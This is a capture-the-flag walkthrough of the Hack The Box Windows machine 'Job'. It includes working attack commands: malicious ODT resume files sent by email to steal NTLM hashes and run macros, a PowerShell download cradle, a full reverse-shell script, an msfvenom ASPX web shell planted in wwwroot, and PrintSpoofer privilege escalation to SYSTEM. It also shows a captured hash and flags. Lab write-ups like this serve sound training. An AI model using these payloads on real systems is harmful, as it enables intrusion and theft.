---
tags:
  - Windows
  - HTB
  - Hacking
  - Boot2Root
  - PrintSpoofer
  - SeImpersonatePrivilege
  - BadODF
  - ODT
---
# Overview

| Name        | Job     |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Medium  |
| Status      | Done    |
# Recon
## Nmap

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.234.73 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 23:11 CST
Nmap scan report for 10.129.234.73
Host is up (0.067s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Job.local
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-05T05:12:06+00:00; -27s from scanner time.
| ssl-cert: Subject: commonName=job
| Not valid before: 2025-09-04T13:43:05
|_Not valid after:  2026-03-06T13:43:05
| rdp-ntlm-info: 
|   Target_Name: JOB
|   NetBIOS_Domain_Name: JOB
|   NetBIOS_Computer_Name: JOB
|   DNS_Domain_Name: job
|   DNS_Computer_Name: job
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-05T05:11:26+00:00
Service Info: Host: JOB; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-05T05:11:27
|_  start_date: N/A
|_clock-skew: mean: -27s, deviation: 0s, median: -27s
```
# Enumeration

![[job.avif]]

There is only a single webpage with an email `career@job.local` asking to send resume for hiring.
## Whatweb

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ whatweb -v -a 3 "http://10.129.234.73"
WhatWeb report for http://10.129.234.73
Status    : 200 OK
Title     : Job.local
IP        : 10.129.234.73
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[career@job.loca], HTML5, HTTPServer[Microsoft-IIS/10.0], Microsoft-IIS[10.0], Script, X-Powered-By[ASP.NET]

Detected Plugins:
[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with 
	HTML, CSS, and JS. 

	Website     : https://getbootstrap.com/

[ Email ]
	Extract email addresses. Find valid email address and 
	syntactically invalid email addresses from mailto: link 
	tags. We match syntactically invalid links containing 
	mailto: to catch anti-spam email addresses, eg. bob at 
	gmail.com. This uses the simplified email regular 
	expression from 
	http://www.regular-expressions.info/email.html for valid 
	email address matching. 

	String       : career@job.loca

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : Microsoft-IIS/10.0 (from server string)

[ Microsoft-IIS ]
	Microsoft Internet Information Services (IIS) for Windows 
	Server is a flexible, secure and easy-to-manage Web server 
	for hosting anything on the Web. From media streaming to 
	web application hosting, IIS's scalable and open 
	architecture is ready to handle the most demanding tasks. 

	Version      : 10.0
	Website     : http://www.iis.net/

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


[ X-Powered-By ]
	X-Powered-By HTTP header 

	String       : ASP.NET (from x-powered-by string)

HTTP Headers:
	HTTP/1.1 200 OK
	Content-Type: text/html
	Last-Modified: Sun, 07 Nov 2021 13:05:58 GMT
	Accept-Ranges: bytes
	ETag: "0bf9f34d8d3d71:0"
	Server: Microsoft-IIS/10.0
	X-Powered-By: ASP.NET
	Date: Mon, 05 Jan 2026 05:17:39 GMT
	Connection: close
	Content-Length: 3261
```

Subdomain or directory busting gives us nothing.
## BadODF

We can try sending mail using `sendmail`

On the webpage it was mentioned that `please send your cv as a libre office document` So we will send the mail with malicious `.odt` file and try to get the ntlm hash

Let’s use [this](https://github.com/rmdavy/badodf) GitHub repo for creating `.odt` file

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~/badodf]
└──╼ [★]$ python3 badodt.py 

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
Python3 version by @gustanini
www.secureyourit.co.uk


Please enter IP of listener: 10.10.15.108
/home/at0mxploit/badodf/bad.odt successfully created
```

now it’s time for testing, it did not worked for some reason

Now I will try `msfconsole` for creating the `.odt` file

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ sudo msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary/fileformat/odt_badodt
[msf](Jobs:0 Agents:0) auxiliary(fileformat/odt_badodt) >> set filename resume.odt
filename => resume.odt
[msf](Jobs:0 Agents:0) auxiliary(fileformat/odt_badodt) >> set lhost 10.10.15.108
lhost => 10.10.15.108
[msf](Jobs:0 Agents:0) auxiliary(fileformat/odt_badodt) >> run
[*] Generating Malicious ODT File 
[*] SMB Listener Address will be set to 10.10.15.108
[+] resume.odt stored at /root/.msf4/local/resume.odt
[*] Auxiliary module execution completed

```

`job.local` add to your host file.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[/root/.msf4/local]
└──╼ [★]$ sendemail -f 'at0m@lookingforajob.com' -t 'career@job.local' -s 10.129.234.73:25 -u 'Resume' -m 'Attaching my resume for your reference' -a 'resume.odt'
Jan 04 23:25:35 htb-gsmlfsngc6 sendemail[27919]: Email was sent successfully!

```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ impacket-smbserver share . -smb2support 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
01/04/2026 11:25:58 PM: INFO: Config file parsed
01/04/2026 11:25:58 PM: INFO: Incoming connection (10.129.234.73,54920)
01/04/2026 11:25:59 PM: INFO: AUTHENTICATE_MESSAGE (JOB\jack.black,JOB)
01/04/2026 11:25:59 PM: INFO: User JOB\jack.black authenticated successfully
01/04/2026 11:25:59 PM: INFO: jack.black::JOB:aaaaaaaaaaaaaaaa:a461dbaeefad5395ae02cfd2b68a7332:010100000000000000f7a1c5037edc01661b647e51fa6c0d0000000001001000770067004b006d00770044004100730003001000770067004b006d007700440041007300020010007a004800620047006c00410055004600040010007a004800620047006c004100550046000700080000f7a1c5037edc01060004000200000008003000300000000000000000000000002000003a605651ecf17be1fca5a3695be00766a18bf904c6e2515ee8a22fe743697e880a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100300038000000000000000000
01/04/2026 11:25:59 PM: INFO: Closing down connection (10.129.234.73,54920)
01/04/2026 11:25:59 PM: INFO: Remaining connections []

```

We cant crack the hash tho.
# Initial Foothold
## Getting shell via ODT file

I will use msfconsole for the exploit

```bash
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use multi/misc/openoffice_document_macro
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> set lhost 10.10.15.108
lhost => 10.10.15.108
[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> set lport 8080
lport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> set payload windows/x64/exec
payload => windows/x64/exec
[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> set CMD "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.108:8000/payload.ps1')"
CMD => powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.108:8000/payload.ps1')
[msf](Jobs:0 Agents:0) exploit(multi/misc/openoffice_document_macro) >> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/misc/openoffice_document_macro) >> 
[*] Using URL: http://10.10.15.108:8080/n6kjhVnC0sjtrE
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[*] Packaging file: meta.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging file: styles.xml
[+] msf.odt stored at /home/at0mxploit/.msf4/local/msf.odt


```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ wget "http://10.10.15.108:8080/YWQgCp0seOdog"
--2026-01-04 23:30:28--  http://10.10.15.108:8080/uWBaGbfumov3
Connecting to 10.10.15.108:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3642 (3.6K) [application/octet-stream]
Saving to: ‘YWQgCp0seOdog’

YWQgCp0seOdog  100%[========>]   3.56K  --.-KB/s    in 0s      

2026-01-04 23:30:28 (441 MB/s) - ‘YWQgCp0seOdog’ saved [3642/3642]
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ # Create a simple PowerShell reverse shell script
cat > payload.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.108',53);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

- Rename it to match the filename Metasploit is serving.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ cp payload.ps1 n6kjhVnC0sjtrE
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~/.msf4/local]
└──╼ [★]$ cd ~/.msf4/local
sendemail -f 'hacker@example.com' -t 'career@job.local' \
  -s 10.129.234.73:25 -u 'Job Application' \
  -m 'Please find my resume attached' -a msf.odt
Jan 04 23:58:44 htb-gsmlfsngc6 sendemail[83476]: Email was sent successfully!
```

```bash
[+] msf.odt stored at /home/at0mxploit/.msf4/local/msf.odt
[*] 10.129.234.73    openoffice_document_macro - Sending payload

┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.234.73 - - [04/Jan/2026 23:59:09] "GET /payload.ps1 HTTP/1.1" 200 -
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~/.msf4/local]
└──╼ [★]$ sudo rlwrap nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.234.73] 54939

PS C:\Program Files\LibreOffice\program> whoami
job\jack.black
PS C:\Program Files\LibreOffice\program> cat C:\\Users\\jack.black\\Desktop\user.txt
0a2752b2689fce8c4d85e701d726294e
```
# Privilege Escalation

The user **job\jack.black**, who is a member of the **JOB\developers** group. This group is explicitly granted **FullControl** permissions on `**C:\\inetpub\\wwwroot**`

```bash
PS C:\Program Files\LibreOffice\program> (Get-Acl .).Access | Format-Table IdentityReference,FileSystemRights,AccessControlType -AutoSize

IdentityReference                                                            FileSystemRights AccessControlType
-----------------                                                            ---------------- -----------------
NT SERVICE\TrustedInstaller                                                       FullControl             Allow
NT SERVICE\TrustedInstaller                                                         268435456             Allow
NT AUTHORITY\SYSTEM                                                               FullControl             Allow
NT AUTHORITY\SYSTEM                                                                 268435456             Allow
BUILTIN\Administrators                                                            FullControl             Allow
BUILTIN\Administrators                                                              268435456             Allow
BUILTIN\Users                                                     ReadAndExecute, Synchronize             Allow
BUILTIN\Users                                                                     -1610612736             Allow
CREATOR OWNER                                                                       268435456             Allow
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES            ReadAndExecute, Synchronize             Allow
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES                            -1610612736             Allow
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES ReadAndExecute, Synchronize             Allow
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES                 -1610612736             Allow
```

```bash
PS C:\Program Files\LibreOffice\program> whoami /groups


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes                                        
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
JOB\developers                         Alias            S-1-5-21-3629909232-404814612-4151782453-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192     
```

Let’s upload the [shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) on wwwroot and load the page.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.108 LPORT=1234 -f aspx -o evil.aspx
```

```bash
PS C:\Program Files\LibreOffice\program> PS C:\Program Files\LibreOffice\program> cd C:\inetpub\wwwroot
PS C:\inetpub\wwwroot> ls


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/10/2021   8:52 PM                aspnet_client                                                        
d-----         11/9/2021   9:24 PM                assets                                                               
d-----         11/9/2021   9:24 PM                css                                                                  
d-----         11/9/2021   9:24 PM                js                                                                   
-a----        11/10/2021   9:01 PM            298 hello.aspx                                                           
-a----         11/7/2021   1:05 PM           3261 index.html                                                           


PS C:\inetpub\wwwroot> powershell iwr 10.10.15.108:8000/evil.aspx -outfile "C:\inetpub\wwwroot\evil.aspx"
```

Trigger it:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[/root/.msf4/local]
└──╼ [★]$ curl http://10.129.234.73/evil.aspx
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-gsmlfsngc6]─[~/.msf4/local]
└──╼ [★]$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.234.73] 54943
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
## SeImpersonatePrivilege (PrintSpoofer)

It’s time to use the potato attack

and we are `nt authority\\system`

```bash
powershell iwr 10.10.15.108:8000/PrintSpoofer64.exe -outfile "C:\Users\Public\PrintSpoofer.exe"
```

```bash
PS C:\Users\Public> .\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cat C:\\Users\\Administrator\\Desktop\root.txt
cat C:\\Users\\Administrator\\Desktop\root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>type C:\\Users\\Administrator\\Desktop\root.txt
type C:\\Users\\Administrator\\Desktop\root.txt
ece2117f0aa20442a59eb83e17e368a3
```

---
